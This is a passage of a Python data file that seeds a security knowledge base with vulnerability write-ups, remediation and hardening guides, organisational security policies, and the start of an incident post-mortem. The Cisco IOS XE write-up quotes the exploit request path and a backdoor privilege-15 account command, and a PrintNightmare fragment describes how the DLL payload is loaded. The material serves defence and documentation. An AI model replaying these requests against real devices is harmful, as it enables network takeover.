The Print Spooler service connects to the remote share, copies the DLL to C:\\Windows\\System32\\spool\\drivers\\x64\\3\\, and loads it into the spoolsv.exe process memory, executing the DLL payload as SYSTEM.
Mitigation: Completely disable the Print Spooler service on all Domain Controllers and member servers that do not actively manage physical print queues: 'Stop-Service -Name Spooler -Force; Set-Service -Name Spooler -StartupType Disabled'. Apply Microsoft cumulative security updates and configure 'Point and Print Restrictions' via GPO to require administrative elevation when installing print drivers.""",
    },
    {
        "title": "CVE-2023-20198 (Cisco IOS XE Web UI) Privilege Escalation & Rogue Account Implant Analysis",
        "category": KBCategory.VULN_WRITEUP,
        "tags": ["cve_2023_20198", "cisco", "ios_xe", "privilege_escalation", "lua", "cisa_kev"],
        "content": """## Executive Summary
CVE-2023-20198 (CVSS 10.0, Critical) is an unauthenticated privilege escalation vulnerability in the web user interface (Web UI) feature of Cisco IOS XE software. An unauthenticated remote attacker can exploit the web interface to create a local user account with privilege level 15 (full root administrative access) on affected network routers and switches.

## Affected Systems & Scope
Cisco routers, switches, and wireless controllers running Cisco IOS XE software with the Web UI feature enabled (specifically configured with 'ip http server' or 'ip http secure-server').

## Threat Impact Analysis
Compromise of network core switches and edge routers grants adversaries total control of enterprise packet forwarding. Threat actors weaponized CVE-2023-20198 in an automated global campaign, creating rogue privilege level 15 accounts and planting stealthy Lua-based implant backdoors in the underlying Linux guest OS to capture internal network traffic and disable security logging. Over 40,000 Cisco devices were compromised globally within days of disclosure.

## Evidence & Technical Details
The flaw exists in the web server's handling of specific HTTP/HTTPS requests that bypass internal authentication checks. An attacker sends an HTTP POST request targeting internal management endpoints:
POST /%2577ebui_wsma_http HTTP/1.1
Host: router.corp.net
Content-Type: application/soap+xml
The request invokes the Web Services Management Agent (WSMA) with root credentials, dispatching a CLI configuration command: 'username backdoor privilege 15 secret 5 $1$backdoor...'.
Adversaries subsequently chained CVE-2023-20273 to write a 16-character hexadecimal token into the web server file system (/usr/binos/conf/iocache/), deploying an interactive Lua backdoor.
Mitigation: Immediately disable the Web UI on all internet-exposed Cisco IOS XE devices by issuing configuration commands: 'no ip http server' and 'no ip http secure-server'. Update devices to fixed Cisco IOS XE releases (17.9.4a+, 17.6.6a+, 17.3.8a+).""",
    },

    # =========================================================================
    # 3. REMEDIATION GUIDES (10 Documents)
    # =========================================================================
    {
        "title": "OWASP Top 10 Web Application Remediation Standard",
        "category": KBCategory.REMEDIATION_GUIDE,
        "tags": ["owasp", "web_security", "sqli", "xss", "ssrf", "remediation", "standards"],
        "content": """## Remediation & Patch Steps
1. Enforce parameterized queries or object-relational mapping (ORM) abstractions across all database interfaces to eliminate SQL injection (A03:2021).
2. Implement server-side role-based and attribute-based access control (RBAC/ABAC) checks on every API endpoint and controller method, validating resource ownership before returning data (A01:2021).
3. Enforce context-aware contextual output encoding (HTML, JavaScript, CSS, URL) across user-rendered interfaces and deploy strict Content-Security-Policy (CSP) headers to neutralize Cross-Site Scripting (A03:2021).
4. Restrict all outbound HTTP requests to an explicit domain allowlist and mandate AWS IMDSv2 token sessions to mitigate Server-Side Request Forgery (A10:2021).
5. Remove all debug endpoints, default vendor credentials, and directory listing indexes from production web servers, enforcing TLS 1.3 with forward secrecy across all public listeners (A05:2021).
6. Store all secrets, tokens, and cryptographic keys in external environment variables or dedicated secret management vaults, eliminating hardcoded credentials in source repositories (A07:2021).

## Verification Procedure
Execute automated Dynamic Application Security Testing (DAST) using OWASP ZAP or Nuclei against candidate staging environments to confirm absence of injection vectors. Perform authenticated static analysis (SAST) with Semgrep to verify parameterization coverage, and validate that HTTP security headers (Strict-Transport-Security, Content-Security-Policy, X-Frame-Options) return expected values on all endpoints.""",
    },
    {
        "title": "Linux Production Server CIS Benchmark Hardening Guide",
        "category": KBCategory.REMEDIATION_GUIDE,
        "tags": ["linux", "hardening", "cis_benchmark", "sshd", "kernel_sysctl", "remediation"],
        "content": """## Remediation & Patch Steps
1. Modify /etc/ssh/sshd_config to disable root login (PermitRootLogin no), disable password authentication (PasswordAuthentication no), enforce SSH protocol 2, and set MaxAuthTries to 3.
2. Apply kernel runtime security parameters in /etc/sysctl.d/99-security.conf: enable SYN flood protection (net.ipv4.tcp_syncookies = 1), disable IP forwarding (net.ipv4.ip_forward = 0), and enable reverse path source validation (net.ipv4.conf.all.rp_filter = 1).
3. Restrict sensitive system file permissions: chmod 600 /etc/shadow, chmod 644 /etc/passwd, chmod 600 /etc/gshadow, and ensure ownership is set to root:root.
4. Deploy the Linux Audit Daemon (auditd) and install CIS baseline audit rules tracking file attribute modifications (chmod, chown), user authentication events, and process executions.
5. Configure host firewall (UFW or nftables) with default DROP policy on incoming connections, permitting ingress strictly on required service ports from approved management CIDRs.
6. Disable legacy and unencrypted services including telnet, rsh, rlogin, tftp, and ftp, removing associated daemon packages from the OS package manager.
7. Configure unattended-upgrades to automatically apply security patches on a daily schedule and reboot outside business operating windows when required.

## Verification Procedure
Run automated Lynis system audit: 'lynis audit system --quick' and verify that the Lynis hardening index scores at or above 80. Confirm active auditd rule status with 'auditctl -l', verify that listening network sockets match approved inventories using 'ss -tulpn', and validate SSH configuration with 'sshd -T'.""",
    },
    {
        "title": "Enterprise TLS 1.3 Transition & Insecure Protocol Deprecation Guide",
        "category": KBCategory.REMEDIATION_GUIDE,
        "tags": ["tls", "cryptography", "ssl", "cipher_suites", "compliance", "hardening"],
        "content": """## Remediation & Patch Steps
1. Deprecate legacy SSLv2, SSLv3, TLS 1.0, and TLS 1.1 across all load balancers, reverse proxies (Nginx, Envoy, HAProxy), and application listeners.
2. Configure TLS 1.3 as the default primary protocol, permitting TLS 1.2 strictly for backwards compatibility with legacy verified clients.
3. Enforce high-strength cipher suites supporting Perfect Forward Secrecy (PFS): TLS_AES_256_GCM_SHA384 and TLS_CHACHA20_POLY1305_SHA256 for TLS 1.3, and ECDHE-ECDSA-AES256-GCM-SHA384 / ECDHE-RSA-AES256-GCM-SHA384 for TLS 1.2.
4. Deploy the HTTP Strict Transport Security (HSTS) header across all HTTPS responses with parameters: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload.
5. Implement automated certificate lifecycle management using ACME or enterprise PKI to rotate certificates at 60-day intervals prior to expiration.
6. Disable TLS session tickets (SessionTicket off) or configure automatic ticket encryption key rotation every 24 hours to preserve forward secrecy guarantees.

## Verification Procedure
Execute testssl.sh or Nmap SSL enumeration against exposed endpoints: 'nmap --script ssl-enum-ciphers,ssl-cert -p 443 target.corp'. Confirm that zero Grade B/C/D ciphers are reported, no CBC-mode ciphers are accepted, and automated scanner reports confirm an SSL Labs Grade A+ equivalent configuration.""",
    },
    {
        "title": "Kubernetes Cluster RBAC & Pod Security Standards Baseline",
        "category": KBCategory.REMEDIATION_GUIDE,
        "tags": ["kubernetes", "k8s", "rbac", "pod_security", "container_security", "remediation"],
        "content": """## Remediation & Patch Steps
1. Eliminate cluster-admin RoleBindings assigned to default service accounts; enforce namespace-scoped Roles and RoleBindings tailored to least-privilege requirements.
2. Enable Kubernetes Pod Security Admission (PSA) across all application namespaces, applying the 'restricted' profile (pod-security.kubernetes.io/enforce: restricted).
3. Disable automatic mounting of API credentials on workload pods by configuring 'automountServiceAccountToken: false' on Pod specs and ServiceAccounts unless explicitly needed.
4. Apply default-deny NetworkPolicies on all tenant namespaces, creating explicit ingress and egress allow rules for required intra-service and DNS communications.
5. Configure container security contexts with: readOnlyRootFilesystem: true, allowPrivilegeEscalation: false, runAsNonRoot: true, and drop all Linux capabilities except NET_BIND_SERVICE.
6. Restrict Kubernetes API server endpoint access to approved administrative CIDR blocks and configure automated audit logging forwarding all request verbs to a secure SIEM.

## Verification Procedure
Execute 'kube-bench --benchmark cis-1.7' against control plane and worker nodes, verifying zero Critical failures. Deploy and execute 'kubeaudit all' to identify privileged pods or missing security contexts, and verify that test deployments violating the restricted PSA profile are actively rejected by the API server.""",
    },
    {
        "title": "Windows Server 2022 Active Directory Domain Controller Hardening Guide",
        "category": KBCategory.REMEDIATION_GUIDE,
        "tags": ["windows_server", "active_directory", "domain_controller", "gpo", "hardening", "cis"],
        "content": """## Remediation & Patch Steps
1. Stop and permanently disable the Print Spooler service (spoolsv.exe) on all Domain Controllers using Group Policy to eliminate PrintNightmare attack vectors.
2. Enforce LDAP channel binding and LDAP signing requirements via registry keys LdapServerIntegrity=2 and LdapEnforceChannelBinding=2 on all Domain Controllers.
3. Configure Group Policy to restrict NTLM authentication, setting 'Network security: Restrict NTLM: Incoming NTLM traffic' to 'Deny all domain accounts' and mandating Kerberos.
4. Enable Windows Defender Credential Guard via UEFI Virtualization-Based Security (VBS) to isolate and protect LSASS memory against Mimikatz memory scraping.
5. Implement the Microsoft Tiering Model (Tier 0 / Tier 1 / Tier 2): prohibit Tier 0 Domain Admin accounts from logging onto lower-tier workstations or member servers.
6. Configure Advanced Audit Policy configuration logging: enable detailed tracking for Kerberos Service Ticket Operations (Event ID 4769) and Directory Service Access (Event ID 4662).
7. Restrict remote RPC access to SAM (Security Account Manager) by configuring the 'Network access: Restrict clients allowed to make remote calls to SAM' policy to authorized administrators only.

## Verification Procedure
Run PingCastle ('PingCastle.exe --healthcheck') against the domain and confirm that the overall risk score is under 20. Execute 'Get-Service Spooler' across all Domain Controllers to confirm stopped status, and run 'klist tickets' to verify that Kerberos AES-256 is the active encryption type.""",
    },
    {
        "title": "Database Security Hardening Standard (PostgreSQL & MySQL Production Enclaves)",
        "category": KBCategory.REMEDIATION_GUIDE,
        "tags": ["database", "postgresql", "mysql", "encryption", "least_privilege", "hardening"],
        "content": """## Remediation & Patch Steps
1. Bind database network listeners strictly to internal private VPC IP addresses (listen_addresses = '10.0.x.x' in postgresql.conf; bind-address = 10.0.x.x in my.cnf), completely disabling public internet exposure.
2. Require mandatory TLS 1.3 encryption for all client connections (ssl = on and ssl_min_protocol_version = 'TLSv1.3' in PostgreSQL; require_secure_transport = ON in MySQL).
3. Apply least-privilege database user access: revoke superuser/root permissions from application service users, granting solely SELECT, INSERT, UPDATE, DELETE on explicit application schemas.
4. Enforce SCRAM-SHA-256 (PostgreSQL password_encryption = scram-sha-256) or caching_sha2_password (MySQL) for password storage, eliminating plaintext or md5 password hashes.
5. Enable Transparent Data Encryption (TDE) or block-level storage volume encryption (LUKS / AWS KMS EBS encryption) for database data directories and backup storage volumes.
6. Configure connection rate limiting, query execution statement timeouts (statement_timeout = 30000ms), and enable detailed connection logging (log_connections = on, log_disconnections = on).

## Verification Procedure
Inspect pg_hba.conf to ensure no 'trust' or 'md5' authentication methods exist. Attempt an unencrypted database connection using 'psql "sslmode=disable"' and verify that the server forcefully rejects the connection. Verify that database process UID is unprivileged ('postgres' or 'mysql', not root) with 'ps aux | grep postgres'.""",
    },
    {
        "title": "AWS Cloud Infrastructure IAM Least Privilege & SCP Governance Guide",
        "category": KBCategory.REMEDIATION_GUIDE,
        "tags": ["aws", "iam", "scp", "cloud_security", "least_privilege", "remediation"],
        "content": """## Remediation & Patch Steps
1. Apply AWS Organizations Service Control Policies (SCPs) at the root organizational unit (OU) to block disabling of CloudTrail, GuardDuty, AWS Config, and SecurityHub across all member accounts.
2. Enforce SCP guardrails preventing the creation of unencrypted EBS volumes (ec2:Encrypted condition) and blocking public ingress on administrative ports (SSH/RDP) in security groups.
3. Remove all wildcard administrative policies ('Action': '*', 'Resource': '*') from user and service IAM roles, utilizing AWS IAM Access Analyzer to generate scoped least-privilege policies.
4. Mandate the use of IAM Permissions Boundaries on all IAM roles created by developers to prevent unauthorized privilege escalation to AdministratorAccess.
5. Require multi-factor authentication (MFA) on all sensitive administrative actions via policy condition 'aws:MultiFactorAuthPresent': 'true'.
6. Enforce automated access key rotation (90 days) and delete all unused access keys older than 30 days using automated AWS Lambda janitor routines.

## Verification Procedure
Execute AWS Security Hub compliance scans against the CIS AWS Foundations Benchmark v2.0, verifying a compliance score above 90%. Run 'aws iam get-account-summary' to verify 0 root account access keys exist, and confirm that all active IAM users have MFA devices enabled.""",
    },
    {
        "title": "Docker Container Image Hardening & Distroless Base Configuration Guide",
        "category": KBCategory.REMEDIATION_GUIDE,
        "tags": ["docker", "containers", "distroless", "vulnerability_management", "hardening"],
        "content": """## Remediation & Patch Steps
1. Migrate container base images from full distribution images (Ubuntu, Debian, Alpine) to Google Container Tools 'distroless' images (e.g. gcr.io/distroless/static or gcr.io/distroless/java), stripping shells, package managers, and OS utilities.
2. Enforce non-root execution inside Dockerfiles by defining an explicit unprivileged UID: 'USER 10001:10001' and ensuring file permissions reflect least privilege.
3. Implement multi-stage Docker builds to ensure build-time compilers (gcc, maven, npm), debuggers, and source code tools are excluded from final production images.
4. Sign container images cryptographically using Cosign / Sigstore during CI/CD build phases and enforce signature verification admission webhooks (Kyverno / Connaisseur) in Kubernetes.
5. Drop all default Linux capabilities in container runtimes and explicitly set 'security_opt: no-new-privileges:true'.
6. Configure automated vulnerability scanning with Grype or Trivy in the CI/CD pipeline, failing builds that contain Critical or High CVEs with available fixes.

## Verification Procedure
Run 'trivy image --severity CRITICAL,HIGH mycompany/app:latest' and confirm zero unpatched vulnerabilities. Attempt to open a remote shell on the container ('docker exec -it <container> /bin/sh') and verify that execution fails because no shell binary exists in the distroless image.""",
    },
    {
        "title": "Network Infrastructure & Switchport 802.1X Dynamic VLAN Hardening Guide",
        "category": KBCategory.REMEDIATION_GUIDE,
        "tags": ["networking", "802.1x", "switch_security", "vlan", "port_security", "radius"],
        "content": """## Remediation & Patch Steps
1. Configure IEEE 802.1X port-based network access control across all corporate access switchports, requiring RADIUS EAP-TLS client certificate authentication before granting network access.
2. Configure dynamic VLAN assignment via RADIUS vendor-specific attributes (VSA), routing authenticated corporate laptops to internal subnets and rogue/unauthenticated devices to an isolated quarantine VLAN.
3. Enable DHCP Snooping on all access switches to prevent rogue DHCP server deployment, configuring uplink ports to core switches as trusted interfaces.
4. Enable Dynamic ARP Inspection (DAI) on all untrusted access VLANs to validate ARP requests and responses against the DHCP snooping binding database, neutralizing ARP cache poisoning.
5. Enable IP Source Guard on access ports to drop packets with spoofed source IP addresses that do not match the DHCP snooping table.
6. Configure Port Security on physical wall jacks with 'switchport port-security maximum 2' and 'switchport port-security violation restrict' to prevent MAC address flooding attacks.

## Verification Procedure
Connect an unauthorized rogue laptop to a physical enterprise switchport and verify that the switch blocks internal IP acquisition and places the device into the isolated remediation VLAN. Run 'show ip dhcp snooping binding' and 'show ip arp inspection statistics' on edge switches to confirm active packet validation.""",
    },
    {
        "title": "Enterprise API Security Gateway & Rate Limiting Hardening Baseline",
        "category": KBCategory.REMEDIATION_GUIDE,
        "tags": ["api_security", "rate_limiting", "jwt", "oauth2", "gateway", "remediation"],
        "content": """## Remediation & Patch Steps
1. Terminate all external API traffic at an enterprise API Gateway (Kong, Envoy, Apigee) that enforces schema validation, rate limiting, and centralized authentication.
2. Enforce OAuth 2.0 with JSON Web Tokens (JWT) signed using asymmetric algorithms (RS256 or ES256); explicitly reject tokens signed with symmetric HMAC or the 'none' algorithm.
3. Implement strict token expiration (access token TTL maximum 15 minutes) and validate JWT claims (iss, aud, exp, nbf) on every incoming API request at the gateway boundary.
4. Configure token-bucket rate limiting per authenticated client ID and per source IP to prevent automated credential stuffing and resource exhaustion attacks (e.g. 100 requests/minute baseline).
5. Implement Object-Level Access Control (BOLA/BFLA prevention) by verifying that the authenticated user ID extracted from JWT claims matches the resource owner parameter in URI paths.
6. Sanitize and validate all incoming request bodies against strict OpenAPI 3.0 JSON schema specifications, dropping unexpected attributes and malformed parameters.

## Verification Procedure
Execute automated API security tests with OWASP ZAP or Postman/Newman security suites. Send a request with a JWT header specifying '"alg": "none"' and confirm HTTP 401 Unauthorized rejection. Exceed configured rate limits and verify that the gateway returns HTTP 429 Too Many Requests with appropriate Retry-After headers.""",
    },

    # =========================================================================
    # 4. ORGANIZATION POLICIES (10 Documents)
    # =========================================================================
    {
        "title": "Organization Vulnerability Management Policy & CISA KEV Remediation SLA",
        "category": KBCategory.POLICY,
        "tags": ["policy", "sla", "cisa_kev", "compliance", "patching"],
        "content": """## Policy Requirement Statement
All enterprise information systems, cloud infrastructure, and network appliances must undergo continuous vulnerability assessment and remediate identified vulnerabilities within strict service level agreement (SLA) timelines based on risk severity:
- CISA KEV Listed Vulnerabilities: Remediation must be completed within 7 calendar days (or within 48 hours for internet-facing assets).
- Critical Severity (CVSS 9.0–10.0): Remediation within 7 calendar days.
- High Severity (CVSS 7.0–8.9): Remediation within 14 calendar days.
- Medium Severity (CVSS 4.0–6.9): Remediation within 30 calendar days.
- Low Severity (CVSS 0.1–3.9): Remediation within 90 calendar days.
When a vendor patch is unavailable, an approved compensating control (WAF rule, network isolation, feature deactivation) must be deployed within the SLA window. Formal risk acceptance requires written sign-off from the Chief Information Security Officer (CISO) and expires automatically after 90 days.

## Applicability Scope
This policy applies to all production, staging, development, and air-gapped environments, including on-premises data centers, cloud infrastructure (AWS, Azure, GCP), microservices, containers, third-party software packages, and operational hardware under enterprise ownership or management.

## Audit & Enforcement
Compliance is evaluated weekly via automated vulnerability scanner reporting (Watch Fortress correlation engine). Assets failing to meet remediation SLAs without an approved CISO risk waiver are subject to automated network isolation, ticket escalation to executive leadership, and revocation of deployment privileges.""",
    },
    {
        "title": "Enterprise Identity Governance, MFA & Password Policy",
        "category": KBCategory.POLICY,
        "tags": ["identity", "mfa", "passwords", "governance", "zero_trust", "compliance"],
        "content": """## Policy Requirement Statement
All user, service, and administrative identities accessing enterprise assets must satisfy baseline identity assurance standards:
1. Multi-Factor Authentication (MFA): Mandatory phishing-resistant MFA (FIDO2 WebAuthn or hardware security keys) for all user access. Mobile push notifications with number matching are permitted for non-administrative roles; SMS and email OTP are prohibited.
2. Password Complexity: User passphrases must contain a minimum of 16 characters. Arbitrary 90-day password rotation is prohibited in accordance with NIST SP 800-63B; passwords must be screened against breached credential databases at creation.
3. Administrative Separation: Administrative duties must be performed using dedicated, unprivileged accounts separate from general email/browsing accounts.
4. Session Management: Maximum session idle timeout is 15 minutes for administrative sessions and 8 hours for general user sessions. Absolute session lifespan cannot exceed 24 hours.

## Applicability Scope
Applies to all workforce employees, contractors, third-party vendors, Active Directory domains, cloud identity providers (Entra ID, Okta), VPN gateways, and developer access channels.

## Audit & Enforcement
Automated identity posture scanners evaluate MFA enforcement daily. Accounts lacking compliant MFA enrollments are automatically suspended. Human Resources and IT Security conduct bi-monthly access recertification audits to deprovision orphaned accounts.""",
    },
    {
        "title": "Cryptographic Key Lifecycle & Encryption Governance Standard",
        "category": KBCategory.POLICY,
        "tags": ["cryptography", "encryption", "key_management", "fips", "compliance", "policy"],
        "content": """## Policy Requirement Statement
All enterprise data at rest and data in transit must be protected using FIPS 140-3 validated cryptographic algorithms and rigorous key lifecycle controls:
1. Data at Rest: Must be encrypted using AES-256-GCM or ChaCha20-Poly1305. Storage media containing classified or customer data must employ hardware-level or full-disk encryption.
2. Data in Transit: Must be protected by TLS 1.3 (or strictly configured TLS 1.2). Unencrypted protocols (HTTP, Telnet, FTP) are strictly prohibited across all networks.
3. Asymmetric Key Lengths: RSA keys must be at least 3072 bits. Elliptic Curve keys must utilize NIST P-256, P-384, or Ed25519 curves.
4. Key Storage: Master encryption keys and root certificates must reside in dedicated Hardware Security Modules (HSMs) or cloud Key Management Services (AWS KMS, Azure Key Vault) with strict separation of duties.
5. Key Rotation: Data encryption keys (DEKs) must be rotated annually; transport certificates must be rotated at least every 90 days.

## Applicability Scope
Applies to all enterprise databases, virtual disk images, backup archives, APIs, inter-service communications, object storage buckets, and mobile client storage.

## Audit & Enforcement
The Corporate Security Office performs semi-annual cryptographic architecture reviews. Continuous automated CI/CD secret scanning scans all repositories to prevent cryptographic keys from entering version control.""",
    },
    {
        "title": "Zero Trust Endpoint & Cloud Perimeter Hardening Guideline",
        "category": KBCategory.POLICY,
        "tags": ["zero_trust", "hardening", "cloud", "perimeter", "iam"],
        "content": """## Policy Requirement Statement
Enterprise networks must adhere to the Zero Trust architecture model: Assume Breach, Verify Explicitly, and Apply Least Privilege Access across every device, workload, and network session:
1. No Direct Management Interfaces Exposed to the Public Internet: Administrative ports (SSH port 22, RDP port 3389, VNC port 5900) and web consoles (ports 8080, 8443, 9090) must NEVER be directly exposed to the public internet. Access must route through authenticated Zero Trust Network Access (ZTNA) or bastion proxies.
2. Device Health Compliance: Access to corporate resources is conditioned upon continuous verification of device compliance (active EDR agent, full disk encryption enabled, OS patch status current within 14 days).
3. Network Microsegmentation: All network segments must enforce default-deny ingress and egress rules. Workstation-to-workstation lateral communications are prohibited.
4. Just-In-Time (JIT) Privileges: Elevated administrative access is granted dynamically on a temporary, time-bound basis (maximum 4 hours) subject to manager approval.

## Applicability Scope
All corporate endpoints (laptops, mobile devices), on-premises server enclaves, cloud VPCs, Kubernetes clusters, and third-party interconnection circuits.

## Audit & Enforcement
Automated perimeter port scans run every 24 hours. Any asset exposing unapproved administrative ports is immediately isolated at the perimeter firewall and flagged as a Sev-1 security incident.""",
    },
    {
        "title": "Enterprise Incident Notification, Data Breach Reporting & Regulatory Compliance Policy",
        "category": KBCategory.POLICY,
        "tags": ["incident_response", "breach_notification", "gdpr", "sec", "compliance", "policy"],
        "content": """## Policy Requirement Statement
In the event of a confirmed or suspected cybersecurity incident involving unauthorized access, exfiltration, or loss of sensitive enterprise or customer data, the organization must adhere to strict internal and external disclosure timelines:
1. Internal Escalation: Any security event graded Severity 1 (Critical) or Severity 2 (High) must be reported to the Computer Security Incident Response Team (CSIRT) and CISO within 30 minutes of initial triage.
2. Executive & Legal Notification: The General Counsel and Chief Information Officer (CIO) must be formally notified in writing within 4 hours of confirmed data compromise.
3. Regulatory Disclosures:
   - SEC Form 8-K Disclosure: Material cybersecurity incidents must be disclosed via SEC Form 8-K within four (4) business days of determining materiality.
   - GDPR / European Data Protection: Personal data breaches impacting EU residents must be reported to competent supervisory authorities within 72 hours of becoming aware of the breach.
   - HIPAA / HITECH: Breaches affecting 500 or more individuals must be reported to HHS without unreasonable delay and in no case later than 60 calendar days.
4. External Communications: No employee, contractor, or investigator is permitted to make public statements or contact regulatory agencies without prior approval from Legal Counsel and Corporate Communications.

## Applicability Scope
Applies to all enterprise subsidiaries, international entities, contractor networks, cloud environments, and vendor integrations processing proprietary or personal identifiable information (PII).

## Audit & Enforcement
Annual tabletop exercises simulate regulatory breach notification workflows. Failure to report a known security incident within mandated SLA timelines constitutes a severe compliance violation subject to disciplinary action up to termination.""",
    },
    {
        "title": "Third-Party Vendor Risk Management & Software Supply Chain Governance Policy",
        "category": KBCategory.POLICY,
        "tags": ["vendor_risk", "tprm", "supply_chain", "sbom", "compliance", "governance"],
        "content": """## Policy Requirement Statement
All third-party vendors, SaaS software providers, contractors, and external open-source software libraries must satisfy rigorous security risk assessments prior to contract execution or technical integration:
1. Vendor Risk Assessments: Third-party vendors processing enterprise data must maintain valid SOC 2 Type II or ISO/IEC 27001 certifications and complete the enterprise Cloud Security Alliance (CSA) CAIQ questionnaire annually.
2. Software Bill of Materials (SBOM): All commercial and custom software packages deployed within enterprise infrastructure must provide a machine-readable Software Bill of Materials in SPDX or CycloneDX format.
3. Dependency Risk Gating: Open-source dependencies incorporated into internal applications must undergo automated Software Composition Analysis (SCA) to verify absence of known unpatched Critical/High vulnerabilities (CVSS >= 7.0) and incompatible licenses.
4. Right to Audit: Enterprise contracts must stipulate contractual audit rights, mandatory 24-hour incident notification clauses, and indemnification against data breaches resulting from vendor negligence.

## Applicability Scope
Applies to all enterprise procurement, legal contracts, vendor onboarding, developer open-source library consumption, and SaaS subscription agreements.

## Audit & Enforcement
Procurement and Vendor Risk Management conduct annual re-assessments of Tier 1 critical suppliers. Dependencies with critical vulnerabilities failing vendor remediation within 30 days are automatically blocked at the enterprise artifact proxy.""",
    },
    {
        "title": "Employee Offboarding, Access Revocation & Asset Recovery Standard",
        "category": KBCategory.POLICY,
        "tags": ["offboarding", "access_revocation", "hr_security", "asset_recovery", "compliance"],
        "content": """## Policy Requirement Statement
To prevent unauthorized data access, intellectual property exfiltration, and orphaned account exposure, employee and contractor termination must follow strict technical offboarding procedures:
1. Involuntary Termination: Access revocation across all Active Directory domains, identity providers (Okta/Entra ID), VPNs, cloud consoles, and building badges must occur synchronously with or immediately prior to the HR notification meeting (zero advance notice window).
2. Voluntary Termination: All system access must be automatically revoked within thirty (30) minutes of the departure time recorded on the employee's final business day.
3. Hardware Asset Recovery: Corporate laptops, mobile devices, hardware MFA keys (YubiKeys), and physical smartcards must be surrendered to IT Security within 48 hours of termination. Remote devices are wiped via MDM remote wipe commands upon account disablement.
4. Cloud & SaaS Token Revocation: IT Operations must trigger global session invalidation across all federated SaaS applications (Slack, Google Workspace, GitHub, Salesforce), terminating active OAuth refresh tokens.
5. Personal Data Wipe Verification: Employees utilizing Bring Your Own Device (BYOD) configurations must permit corporate container removal via MDM software.

## Applicability Scope
Applies to all full-time employees, part-time staff, interns, independent contractors, temporary workers, and third-party consultants holding enterprise access credentials.

## Audit & Enforcement
IT Security conducts weekly automated reconciliation comparing HR termination records against active directory and cloud identity user statuses. Any orphaned account identified past the 24-hour window generates an immediate compliance audit ticket.""",
    },
    {
        "title": "Secure Software Development Lifecycle (SSDLC) & Code Security Policy",
        "category": KBCategory.POLICY,
        "tags": ["ssdlc", "devsecops", "sast", "dast", "code_review", "policy"],
        "content": """## Policy Requirement Statement
All custom software, microservices, APIs, and infrastructure-as-code (IaC) developed internally or by contractors must adhere to the Secure Software Development Lifecycle (SSDLC) framework:
1. Architecture Threat Modeling: Architectural threat modeling (STRIDE methodology) must be completed and documented during the design phase for any service processing sensitive data or exposing public endpoints.
2. Automated SAST & Secret Scanning: Continuous static application security testing (SAST) and secret scanning tools must execute automatically on every pull request. Commits containing hardcoded secrets or Critical SAST findings are blocked from merging.
3. Peer Code Review: Every code change requires independent review and formal approval from at least one qualified peer engineer prior to production merging. Author self-approvals are technically prohibited.
4. Automated DAST & Container Scanning: Staging deployment environments must undergo automated Dynamic Application Security Testing (DAST) and container vulnerability scanning before promotion to production.
5. Production Access Gating: Developers are strictly prohibited from holding persistent write access to production database tables or production server shells; deployments must occur exclusively via automated CI/CD pipelines.

## Applicability Scope
All proprietary source code repositories, microservices, mobile applications, firmware builds, and cloud deployment templates developed under enterprise purview.

## Audit & Enforcement
DevSecOps teams track deployment gating metrics. Repository branches failing required automated security checks cannot bypass merge protections without signed emergency exception waivers from the Head of Application Security.""",
    },
    {
        "title": "Cloud Resource Tagging, Ownership & Public Exposure Governance Policy",
        "category": KBCategory.POLICY,
        "tags": ["cloud_governance", "tagging", "aws", "azure", "compliance", "policy"],
        "content": """## Policy Requirement Statement
All cloud assets and resources provisioned across enterprise cloud environments (AWS, Azure, GCP) must maintain strict accountability and governance controls:
1. Mandatory Resource Tags: Every provisioned cloud resource must include four standardized tags:
   - Owner (valid corporate email of the responsible technical lead)
   - Environment (production, staging, development, sandbox)
   - CostCenter (valid corporate billing allocation code)
   - DataClassification (restricted, confidential, internal, public)
2. Automated Untagged Resource Remediation: Any resource created without mandatory tags triggers an automated warning and is terminated automatically after 72 hours if tags are not applied.
3. Prohibited Public Exposure: Storage buckets, relational databases, virtual machine network interfaces, and cache clusters must NEVER have public IP addresses or unrestricted (0.0.0.0/0) security group rules unless approved via written Cloud Security Architecture exemption.
4. Ephemeral Sandbox Lifecycles: Sandbox and test environments are subject to mandatory automatic termination every 14 days to prevent abandoned asset sprawl.

## Applicability Scope
All public cloud accounts, subscriptions, projects, VPCs, and associated workload resources within the enterprise cloud estate.

## Audit & Enforcement
Automated cloud posture monitoring tools (Cloud Custodian / AWS Config) evaluate tagging compliance continuously. Non-compliant assets are flagged in daily engineering digests and escalated to departmental directors.""",
    },
    {
        "title": "Enterprise Data Classification, Retention & Sanitization Governance Policy",
        "category": KBCategory.POLICY,
        "tags": ["data_classification", "retention", "sanitization", "nist_800_88", "compliance"],
        "content": """## Policy Requirement Statement
All information assets generated, processed, or stored by the organization must be categorized under the enterprise data classification schema and managed throughout their lifecycle:
1. Data Classification Tiers:
   - Restricted: High-risk trade secrets, customer payment cards (PCI), cryptographic master keys, and personally identifiable health data (PHI). Requires AES-256 encryption at rest and in transit, strict RBAC, and dedicated audit logging.
   - Confidential: Non-public business operations data, financial reports, internal employee records, and vendor contracts. Requires encryption and authenticated access.
   - Internal: General communications, operational policies, and non-sensitive internal documentation.
   - Public: Information explicitly approved for general public dissemination (marketing collateral, public press releases).
2. Data Retention Schedules: Financial transaction records must be retained for seven (7) years. Security audit logs must be preserved in immutable storage for a minimum of 365 days. Temporary staging data must be purged within 30 days.
3. Media Sanitization & Disposal: Decommissioned physical drives, SSDs, and storage arrays must be sanitized in accordance with NIST SP 800-88 Rev 1 (Cryptographic Erase or Physical Degaussing and Destruction) with certified certificates of destruction.

## Applicability Scope
Applies to all enterprise data repositories, object stores, databases, employee workstations, physical storage media, and cloud environments.

## Audit & Enforcement
Information Governance and Internal Audit conduct semi-annual data retention audits. Inappropriate storage of Restricted data on unapproved systems results in immediate data quarantine and mandatory incident review.""",
    },

    # =========================================================================
    # 5. LESSONS LEARNED (10 Documents)
    # =========================================================================
    {
        "title": "Incident Post-Mortem: Staging Environment Database Credential Exposure",
        "category": KBCategory.LESSONS_LEARNED,
        "tags": ["post_mortem", "incident_review", "credential_leak", "git", "secrets", "lessons_learned"],
        "content": """## Incident Chronology
- 03:14 UTC: Automated public repository scanner detected valid AWS RDS staging database credentials committed into a developer's public GitHub fork.
- 03:22 UTC: SecOps on-call engineer received high-priority alert and confirmed the exposed staging database contained an anonymized copy of user profile records.
- 03:31 UTC: CloudTrail logs revealed 14 unauthorized connection attempts to the staging database endpoint originating from anonymous Tor exit nodes.
- 03:38 UTC: Security engineer updated the RDS Security Group to drop all inbound traffic from outside the corporate VPC CIDR, severing adversary access.
